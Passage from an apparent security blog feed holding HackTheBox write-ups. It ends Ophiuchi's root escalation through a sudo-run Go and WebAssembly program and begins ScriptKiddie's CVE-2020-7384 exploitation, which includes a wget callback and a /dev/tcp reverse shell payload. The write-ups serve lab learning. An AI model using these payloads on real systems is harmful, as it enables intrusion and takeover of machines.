&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ls -alR conf&lt;/span&gt;
&lt;span class="code-line"&gt;conf:&lt;/span&gt;
&lt;span class="code-line"&gt;total 240&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-x--- 2 root tomcat   4096 Dec 28 00:37 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 9 root tomcat   4096 Oct 11 14:07 ..&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat  12873 Sep 10 08:25 catalina.policy&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   7262 Sep 10 08:25 catalina.properties&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   1400 Sep 10 08:25 context.xml&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   1149 Sep 10 08:25 jaspic-providers.xml&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   2313 Sep 10 08:25 jaspic-providers.xsd&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   4144 Sep 10 08:25 logging.properties&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   7588 Sep 10 08:25 server.xml&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   2234 Dec 28 00:37 tomcat-users.xml&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat   2558 Sep 10 08:25 tomcat-users.xsd&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r----- 1 root tomcat 172359 Sep 10 08:25 web.xml&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at the file and found a few default username and passwords and also the
&lt;code&gt;admin&lt;/code&gt; user with the &lt;code&gt;whythereisalimit&lt;/code&gt; password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat conf/tomcat*&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;UTF-8&amp;quot;?&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!--&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;tomcat-users xmlns=&amp;quot;http://tomcat.apache.org/xml&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;              xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;              xsi:schemaLocation=&amp;quot;http://tomcat.apache.org/xml tomcat-users.xsd&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;        version=&amp;quot;1.0&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;user username=&amp;quot;admin&amp;quot; password=&amp;quot;whythereisalimit&amp;quot; roles=&amp;quot;manager-gui,admin-gui&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;!--&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;role rolename=&amp;quot;tomcat&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;role rolename=&amp;quot;role1&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;tomcat&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;both&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;tomcat,role1&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  &amp;lt;user username=&amp;quot;role1&amp;quot; password=&amp;quot;&amp;lt;must-be-changed&amp;gt;&amp;quot; roles=&amp;quot;role1&amp;quot;/&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;--&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We connect to the box with SSH using this user and got the first flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ #whythereisalimit&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ ssh admin@10.129.98.255&lt;/span&gt;
&lt;span class="code-line"&gt;admin@10.129.98.255&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-51-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&amp;lt;SNIP&amp;gt;&lt;/span&gt;
&lt;span class="code-line"&gt;admin@ophiuchi:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(admin) gid=1000(admin) groups=1000(admin)&lt;/span&gt;
&lt;span class="code-line"&gt;admin@ophiuchi:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;6aa83180b3e469e3f5de725c639a601b&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We enumerate the box and quickly found out that we can execute a specific go
program as root without password.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;admin@ophiuchi:~$ sudo -l&lt;/span&gt;
&lt;span class="code-line"&gt;Matching Defaults entries for admin on ophiuchi:&lt;/span&gt;
&lt;span class="code-line"&gt;    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;User admin may run the following commands on ophiuchi:&lt;/span&gt;
&lt;span class="code-line"&gt;    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The content of the "index.go" file is the following:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;package&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kn"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;fmt&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;wasm&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;github.com/wasmerio/wasmer-go/wasmer&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;os/exec&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;log&amp;quot;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kd"&gt;func&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;wasm&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;ReadBytes&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;main.wasm&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;instance&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;wasm&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;NewInstance&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;bytes&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;defer&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;instance&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;instance&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Exports&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;info&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nx"&gt;_&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;init&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;String&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;f&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Not ready to deploy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Ready to deploy&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="nx"&gt;out&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;:=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Command&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;deploy.sh&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;Output&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;!=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;nil&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                        &lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Fatal&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;err&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;                &lt;/span&gt;&lt;span class="nx"&gt;fmt&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;string&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;out&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;        &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Basically the program read a webassemply file &lt;code&gt;main.wasm&lt;/code&gt; using a relative path
and if the file map "info" return &lt;code&gt;1&lt;/code&gt; it run a bash script &lt;code&gt;deploy.sh&lt;/code&gt; also
using a relative path. We "just" need to create a new &lt;code&gt;main.wasm&lt;/code&gt; that return
&lt;code&gt;1&lt;/code&gt; and a bash script that give us the root flag.&lt;/p&gt;
&lt;p&gt;We download main.wasm and "decompile" it using &lt;a href="https://github.com/WebAssembly/wabt"&gt;wabt&lt;/a&gt; and its online &lt;a href="https://webassembly.github.io/wabt/demo/wasm2wat/"&gt;wasm2wat "decompiler"&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Using &lt;a href="https://webassembly.github.io/wabt/demo/wat2wasm/"&gt;wat2wasm&lt;/a&gt; We just change the fourth line &lt;code&gt;(i32.const 0))&lt;/code&gt; to &lt;code&gt;(i32.const 1))&lt;/code&gt; and download the resulting wasm file.
We upload it on the box in our home folder and create a deploy.sh bash file to display the root flag:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~/pown/htb_Ophiuchi$ scp  test.wasm  admin@10.129.98.255:main.wasm&lt;/span&gt;
&lt;span class="code-line"&gt;admin@10.129.98.255&amp;#39;s password:&lt;/span&gt;
&lt;span class="code-line"&gt;test.wasm&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;admin@ophiuchi:~$ echo &amp;#39;cat /root/root.txt&amp;#39; &amp;gt; deploy.sh&lt;/span&gt;
&lt;span class="code-line"&gt;admin@ophiuchi:~$ chmod +x deploy.sh&lt;/span&gt;
&lt;span class="code-line"&gt;admin@ophiuchi:~$ sudo /usr/bin/go run /opt/wasm-functions/index.go&lt;/span&gt;
&lt;span class="code-line"&gt;Ready to deploy&lt;/span&gt;
&lt;span class="code-line"&gt;d153e100b32fe456e149a86ef6468ac6&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;A very interesting box that I would recommend to beginners as it is mostly
straightforward with no rabbit hole.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="Linux"></category><category term="YAML"></category><category term="deserialization"></category><category term="webassembly"></category></entry><entry><title>HTB: ScriptKiddie</title><link href="https://maggick.fr/2021/06/htb-scriptkiddie.html" rel="alternate"></link><published>2021-06-07T10:25:00+02:00</published><updated>2021-06-07T10:25:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-06-07:/2021/06/htb-scriptkiddie.html</id><summary type="html">&lt;p&gt;&lt;img alt="ScriptKiddie Card" class="align-left" src="/media/2021.06/sk_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/314"&gt;ScriptKiddie&lt;/a&gt; publish on
February 6, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/4935"&gt;0xdf&lt;/a&gt;.
This box is rated as easy box the user part implies to use CVE-2020-7384, the
root part is just abusing a bash script and using msfconsole.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.06/sk_card.png" alt="ScriptKiddie Card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/314"&gt;ScriptKiddie&lt;/a&gt; publish on
February 6, 2021 by
&lt;a href="https://www.hackthebox.eu/home/users/profile/4935"&gt;0xdf&lt;/a&gt;.
This box is rated as easy box the user part implies to use CVE-2020-7384, the
root part is just abusing a bash script and using msfconsole.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 22 (SSH) and 5000 with a HTTP
service are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Sun Feb  7 08:50:44 2021 as: nmap -p- -sSV -oN nmap 10.129.94.194&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.94.194&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.011s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65533 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT     STATE SERVICE VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)&lt;/span&gt;
&lt;span class="code-line"&gt;5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Sun Feb  7 08:51:09 2021 -- 1 IP address (1 host up) scanned in 24.16 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The webpage seems to be a "hacker" personal page with a few wrapper around
classical tools as &lt;code&gt;nmap&lt;/code&gt;, &lt;code&gt;msfvenom&lt;/code&gt; and &lt;code&gt;searchsploit&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Homepage" src="/media/2021.06/sk_01.png"&gt;&lt;/p&gt;
&lt;p&gt;The "template file" option with &lt;code&gt;msfvenom&lt;/code&gt; is strange. After a few Google research we found
about CVE-2020-7384 which is "msfvenom APK template command injection" and has
&lt;a href="https://www.exploit-db.com/exploits/49491"&gt;a public exploit available&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;We change the payload to perform a &lt;code&gt;wget&lt;/code&gt; on our python server&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;# Change me&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;wget 10.10.14.64:8000&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We got a hit on our local python HTTP which confirm our RCE.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp$ python3 -m http.server&lt;/span&gt;
&lt;span class="code-line"&gt;Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...&lt;/span&gt;
&lt;span class="code-line"&gt;10.129.94.194 - - [07/Feb/2021 09:27:09] &amp;quot;GET / HTTP/1.1&amp;quot; 200 -&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We change the payload again for a reverse shell.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="n"&gt;payload&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;sh -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.64/4433 0&amp;gt;&amp;amp;1&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We run netcat to catch it and got the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:/tmp$ nc -l -p 4433&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;sh: 0: can&amp;#39;t access tty; job control turned off&lt;/span&gt;
&lt;span class="code-line"&gt;$ uid=1000(kid) gid=1000(kid) groups=1000(kid)&lt;/span&gt;
&lt;span class="code-line"&gt;$ cd&lt;/span&gt;
&lt;span class="code-line"&gt;$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;51573bc36ae7c15d3bb11c3b043a5dea&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;h2 id="persistance"&gt;Persistance&lt;/h2&gt;
&lt;p&gt;We look at our user home folder and get the SSH private key&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ls -al&lt;/span&gt;
&lt;span class="code-line"&gt;total 60&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x 11 kid  kid  4096 Feb  3 11:49 .&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  4 root root 4096 Feb  3 07:40 ..&lt;/span&gt;
&lt;span class="code-line"&gt;lrwxrwxrwx  1 root kid     9 Jan  5 20:31 .bash_history -&amp;gt; /dev/null&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid   220 Feb 25  2020 .bash_logout&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid  3771 Feb 25  2020 .bashrc&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .bundle&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------  2 kid  kid  4096 Feb  3 07:40 .cache&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------  4 kid  kid  4096 Feb  3 11:49 .gnupg&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  3 kid  kid  4096 Feb  3 07:40 .local&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  9 kid  kid  4096 Feb  3 07:40 .msf4&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid   807 Feb 25  2020 .profile&lt;/span&gt;
&lt;span class="code-line"&gt;drwx------  2 kid  kid  4096 Feb  3 07:40 .ssh&lt;/span&gt;
&lt;span class="code-line"&gt;-rw-r--r--  1 kid  kid     0 Jan  5 11:10 .sudo_as_admin_successful&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxr-x  5 kid  kid  4096 Feb  7 14:25 html&lt;/span&gt;
&lt;span class="code-line"&gt;drwxrwxrwx  2 kid  kid  4096 Feb  3 07:40 logs&lt;/span&gt;
&lt;span class="code-line"&gt;drwxr-xr-x  3 kid  kid  4096 Feb  3 11:48 snap&lt;/span&gt;
&lt;span class="code-line"&gt;-r--------  1 kid  kid    33 Feb  7 13:48 user.txt&lt;/span&gt;
